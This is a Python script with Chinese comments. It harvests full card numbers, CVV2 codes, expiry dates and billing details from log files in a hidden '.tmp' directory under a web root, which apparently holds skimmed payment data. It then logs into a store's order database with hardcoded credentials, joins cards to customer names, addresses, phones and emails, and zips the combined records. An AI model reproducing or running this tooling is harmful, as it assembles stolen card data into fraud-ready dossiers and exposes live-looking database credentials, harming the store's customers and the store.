#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
1. 自动从日志文件名提取日期范围
2. 使用参数化查询防止 SQL 注入
3. 提取卡号信息、查询数据库、合并数据
4. 结果统一输出并打包
"""

import json
import urllib.parse
import csv
import os
import glob
import sys
import shutil
import re
from datetime import datetime
from typing import List, Dict, Optional, Tuple

# ==================== 配置区域 ====================

# 1. 获取当前日期作为文件夹名称
TODAY_STR = datetime.now().strftime('%Y-%m-%d')
OUTPUT_DIR = TODAY_STR

# 如果文件夹不存在则创建
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

# 2. 原始日志存放目录
TMP_DIR = '/var/www/html/include/.tmp/' 

# 3. MySQL数据库配置
DB_CONFIG = {
    'host': 'cns-db.cluster-ccdbkjarcf25.us-east-2.rds.amazonaws.com',
    'port': 3306,
    'user': 'canadana_dbuser',
    'password': 'r.%Cn9MQZ1lp',
    'database': 'canadana_beta',
    'charset': 'utf8mb4'
}

# 4. 输出文件路径配置 (存放在日期文件夹内)
CARD_INFO_FILE = os.path.join(OUTPUT_DIR, 'card_info_all_extracted.csv')
ORDER_FILE = os.path.join(OUTPUT_DIR, 'order.csv')
COMPLETE_INFO_FILE = os.path.join(OUTPUT_DIR, 'complete_info.csv')
RUN_LOG_FILE = os.path.join(OUTPUT_DIR, 'process.log')

# ==================== 日志重定向配置 ====================

class Logger(object):
    def __init__(self, filename):
        self.terminal = sys.stdout
        self.log = open(filename, "a", encoding="utf-8")

    def write(self, message):
        self.terminal.write(message)
        if message and message.strip() != "":
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
            self.log.write(timestamp + message.strip() + "\n")
        elif message == "\n":
            self.log.write(message)

    def flush(self):
        self.log.flush()
        self.terminal.flush()

# 重定向输出
sys.stdout = Logger(RUN_LOG_FILE)
sys.stderr = Logger(RUN_LOG_FILE)

# ==================== 工具函数 ====================

def _strip(val) -> str:
    return str(val).strip() if val is not None else ""

def parse_url_params(param_string: str) -> Dict[str, str]:
    params = {}
    for pair in param_string.split('&'):
        if '=' in pair:
            key, value = pair.split('=', 1)
            params[key] = urllib.parse.unquote_plus(value)
    return params

def parse_expiry_date(expdate: str) -> Dict[str, str]:
    if len(expdate) == 6:
        month, year = expdate[:2], expdate[2:]
        return {'month': month, 'year': year, 'formatted': f"{month}/{year}"}
    return {'month': '', 'year': '', 'formatted': expdate}

def luhn_check(card_number: str) -> bool:
    card_number = card_number.replace(' ', '').replace('-', '')
    if not card_number.isdigit() or not card_number:
        return False
    r = [int(ch) for ch in card_number][::-1]
    return (sum(r[0::2]) + sum(sum(divmod(d * 2, 10)) for d in r[1::2])) % 10 == 0

def normalize_name(name: str) -> str:
    return ' '.join(name.lower().strip().split()) if name else ""

def format_address(record: Dict) -> str:
    """格式化地址信息"""
    parts = []
    if _strip(record.get('address1')):
        addr = _strip(record.get('address1'))
        if _strip(record.get('address2')): addr += f", {_strip(record.get('address2'))}"
        parts.append(addr)
    if _strip(record.get('city')):
        city_info = _strip(record.get('city'))
        if _strip(record.get('state')): city_info += f", {_strip(record.get('state'))}"
        if _strip(record.get('zip')): city_info += f" {_strip(record.get('zip'))}"
        parts.append(city_info)
    if not parts:
        if _strip(record.get('ShippingAddress1')):
            addr = _strip(record.get('ShippingAddress1'))
            if _strip(record.get('ShippingAddress2')): addr += f", {_strip(record.get('ShippingAddress2'))}"
            parts.append(addr)
    return " | ".join(parts) if parts else ""

# ==================== 核心处理模块 ====================

def get_date_range_from_logs(log_dir: str) -> Tuple[Optional[str], Optional[str]]:
    """从文件名 curl_YYYYMMDD.log 中提取日期范围"""
    dates = []
    patterns = [os.path.join(log_dir, 'curl_*.log'), os.path.join(log_dir, 'paypal_sdk_*.log')]
    for p in patterns:
        for f_path in glob.glob(p):
            f_name = os.path.basename(f_path)
            # 使用正则表达式提取 8 位数字
            match = re.search(r'(\d{8})', f_name)
            if match:
                date_str = match.group(1) # YYYYMMDD
                try:
                    # 转换为 YYYY-MM-DD 格式
                    formatted_date = f"{date_str[:4]}-{date_str[4:6]}-{date_str[6:8]}"
                    dates.append(formatted_date)
                except:
                    continue
    
    if not dates:
        return None, None
    
    # 返回最小值和最大值
    return min(dates), max(dates)

def extract_card_info(log_file: str, source_file: str) -> List[Dict]:
    results = []
    with open(log_file, 'r', encoding='utf-8') as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line or '|' not in line: continue
            try:
                timestamp_str, json_str = line.split('|', 1)
                data = json.loads(json_str)
                rq = parse_url_params(data.get('rq', ''))
                rs = parse_url_params(data.get('rs', ''))
                exp = parse_expiry_date(rq.get('EXPDATE', ''))
                results.append({
                    '时间戳': timestamp_str, 'Unix时间戳': data.get('t', ''),
                    '卡号': rq.get('ACCT', ''), '过期月份': exp['month'], '过期年份': exp['year'],
                    '过期日期': exp['formatted'], 'CVV2': rq.get('CVV2', ''),
                    '姓名': f"{rq.get('FIRSTNAME', '')} {rq.get('LASTNAME', '')}".strip(),
                    '名': rq.get('FIRSTNAME', ''), '姓': rq.get('LASTNAME', ''),
                    '金额': rq.get('AMT', ''), '货币': rq.get('CURRENCYCODE', ''),
                    '交易状态': rs.get('ACK', ''), '交易ID': rs.get('TRANSACTIONID', ''),
                    'IP地址': data.get('ip', ''), '地址': rq.get('STREET', ''),
                    '城市': rq.get('CITY', ''), '州省': rq.get('STATE', ''),
                    '邮编': rq.get('ZIP', ''), '国家代码': rq.get('COUNTRYCODE', '')
                })
            except Exception as e:
                print(f"警告：{source_file} 第 {line_num} 行处理失败: {e}")
    return results

def process_all_logs(log_dir: str, output_file: str) -> List[Dict]:
    all_results = []
    patterns = [os.path.join(log_dir, 'curl_*.log'), os.path.join(log_dir, 'paypal_sdk_*.log')]
    log_files = []
    for p in patterns: log_files.extend(glob.glob(p))
    log_files.sort()
    
    if not log_files:
        print(f"警告：在 {log_dir} 目录下未找到日志文件")
        return []
    
    print(f"找到 {len(log_files)} 个日志文件，开始处理...")
    for f_path in log_files:
        f_name = os.path.basename(f_path)
        res = extract_card_info(f_path, f_name)
        all_results.extend(res)
        print(f"处理: {f_name} -> 提取了 {len(res)} 条记录")
    
    if all_results:
        fieldnames = ['时间戳', 'Unix时间戳', '卡号', '过期月份', '过期年份', '过期日期', 'CVV2', '姓名', '名', '姓', '金额', '货币', '交易状态', '交易ID', 'IP地址', '地址', '城市', '州省', '邮编', '国家代码']
        with open(output_file, 'w', newline='', encoding='utf-8-sig') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(all_results)
        print(f"卡号信息已保存到: {output_file}")
    return all_results

def query_orders_from_db(db_config: Dict, start_date: str, end_date: str, output_file: str) -> bool:
    """使用参数化查询获取订单数据，防止 SQL 注入"""
    try:
        import pymysql
        conn = pymysql.connect(**db_config)
        print(f"数据库连接成功，准备查询日期范围: {start_date} 至 {end_date}")
        
        # 定义 SQL 模板，使用 %s 作为占位符
        sql = "SELECT * FROM canadana_beta.OrderTable WHERE Date BETWEEN %s AND %s"
        
        with conn.cursor(pymysql.cursors.DictCursor) as cursor:
            # 执行时传入参数元组，驱动会自动处理转义
            cursor.execute(sql, (start_date, end_date))
            results = cursor.fetchall()
            
            if not results:
                print(f"警告：在 {start_date} 到 {end_date} 期间查询结果为空")
                return False
            
            print(f"查询到 {len(results)} 条订单记录")
            with open(output_file, 'w', newline='', encoding='utf-8-sig') as f:
                writer = csv.DictWriter(f, fieldnames=list(results[0].keys()))
                writer.writeheader()
                writer.writerows(results)
            print(f"订单数据已保存到: {output_file}")
            return True
    except Exception as e:
        print(f"数据库/查询错误: {e}")
        return False
    finally:
        if 'conn' in locals(): conn.close()

def merge_and_save(card_file: str, order_file: str, output_file: str):
    # 加载卡片
    trans_map, name_map = {}, {}
    with open(card_file, 'r', encoding='utf-8-sig') as f:
        for row in csv.DictReader(f):
            c_num = _strip(row.get('卡号'))
            if not luhn_check(c_num): continue
            row['Luhn验证'] = '通过'
            tid = _strip(row.get('交易ID'))
            if tid: trans_map[tid] = row
            fname, lname = _strip(row.get('名')), _strip(row.get('姓'))
            if fname and lname:
                k1 = normalize_name(f"{fname} {lname}")
                name_map.setdefault(k1, []).append(row)

    # 合并逻辑
    final_data = []
    m_tid, m_name, m_none = 0, 0, 0
    with open(order_file, 'r', encoding='utf-8-sig') as f:
        orders = list(csv.DictReader(f))
    
    for od in orders:
        match, method = None, ""
        tid = _strip(od.get('TransactionID'))
        if tid and tid in trans_map:
            match, method, m_tid = trans_map[tid], "交易ID", m_tid + 1
        else:
            n_variants = [
                normalize_name(f"{od.get('first_name')} {od.get('last_name')}"),
                normalize_name(f"{od.get('ShippingFirstName')} {od.get('ShippingLastName')}")
            ]
            for nv in n_variants:
                if nv in name_map:
                    match, method, m_name = name_map[nv][0], "姓名", m_name + 1
                    break
        
        if match:
            rec = {**od, **match}
            rec['匹配方式'] = method
            rec['订单姓名'] = f"{od.get('first_name','')} {od.get('last_name','')}".strip()
            rec['姓名（卡）'] = match.get('姓名')
            rec['名（卡）'] = match.get('名')
            rec['姓（卡）'] = match.get('姓')
            final_data.append(rec)
        else:
            m_none += 1

    print(f"匹配统计：交易ID: {m_tid}, 姓名: {m_name}, 未匹配: {m_none}")
    
    if final_data:
        fieldnames = [
            '订单ID', '客户ID', '订单日期', '订单金额', '交易ID', '邮箱', '匹配方式',
            '订单姓名', '订单名', '订单姓', '卡号姓名', '卡号名', '卡号姓',
            '账单地址1', '账单地址2', '账单城市', '账单州省', '账单邮编', '账单电话',
            '配送名', '配送姓', '配送地址1', '配送地址2', '配送城市', '配送邮编', '配送国家', '配送电话',
            '完整地址', '卡号', '过期日期', '过期月份', '过期年份', 'CVV2', '金额', '货币', '交易状态', '交易时间', 'IP地址', 'Luhn验证'
        ]

        header_map = {
            'OrderID': '订单ID', 'CustomerID': '客户ID', 'Date': '订单日期', 
            'OrderAmount': '订单金额', 'TransactionID': '交易ID', 'Email': '邮箱',
            '匹配方式': '匹配方式', '订单姓名': '订单姓名', 'first_name': '订单名', 'last_name': '订单姓',
            '姓名（卡）': '卡号姓名', '名（卡）': '卡号名', '姓（卡）': '卡号姓',
            'address1': '账单地址1', 'address2': '账单地址2', 'city': '账单城市', 'state': '账单州省', 
            'zip': '账单邮编', 'night_phone_b': '账单电话', 'ShippingFirstName': '配送名', 
            'ShippingLastName': '配送姓', 'ShippingAddress1': '配送地址1', 'ShippingAddress2': '配送地址2',
            'ShippingCity': '配送城市', 'ShippingZip': '配送邮编', 'ShippingCountry': '配送国家', 
            'ShippingPhone': '配送电话', '完整地址': '完整地址', '卡号': '卡号', '过期日期': '过期日期', 
            '过期月份': '过期月份', '过期年份': '过期年份', 'CVV2': 'CVV2', '金额': '金额', '货币': '货币', 
            '交易状态': '交易状态', '时间戳': '交易时间', 'IP地址': 'IP地址', 'Luhn验证': 'Luhn验证'
        }

        with open(output_file, 'w', newline='', encoding='utf-8-sig') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction='ignore')
            writer.writeheader()
            for r in final_data:
                r['完整地址'] = format_address(r)
                row_to_write = {}
                for orig_key, chinese_key in header_map.items():
                    if chinese_key in fieldnames:
                        row_to_write[chinese_key] = r.get(orig_key, '')
                writer.writerow(row_to_write)
        print(f"完整信息已保存到: {output_file}，共 {len(final_data)} 条记录")

# ==================== 主程序 ====================

def main():
    print("=" * 50)
    print(f"任务启动 | 目标目录: {OUTPUT_DIR}")
    print("=" * 50)
    
    # 步骤1: 提取卡号并确定日期范围
    print("【1/4】扫描日志并提取日期范围...")
    start_d, end_d = get_date_range_from_logs(TMP_DIR)
    
    if not start_d or not end_d:
        print("错误：无法从日志文件名中提取有效日期，任务终止。")
        return

    if not process_all_logs(TMP_DIR, CARD_INFO_FILE):
        return

    # 步骤2: 数据库查询 (使用提取出的日期)
    print("【2/4】查询订单数据库...")
    if not query_orders_from_db(DB_CONFIG, start_d, end_d, ORDER_FILE):
        return

    # 步骤3: 合并
    print("【3/4】执行数据匹配与合并...")
    merge_and_save(CARD_INFO_FILE, ORDER_FILE, COMPLETE_INFO_FILE)

    # 步骤4: 打包
    print("【4/4】正在打包文件夹...")
    sys.stdout.flush()
    zip_path = shutil.make_archive(OUTPUT_DIR, 'zip', OUTPUT_DIR)
    
    print("=" * 50)
    print(f"流程执行完毕！")
    print(f"日志检测范围: {start_d} 至 {end_d}")
    print(f"打包文件位置: {zip_path}")
    print("=" * 50)

if __name__ == '__main__':
    main()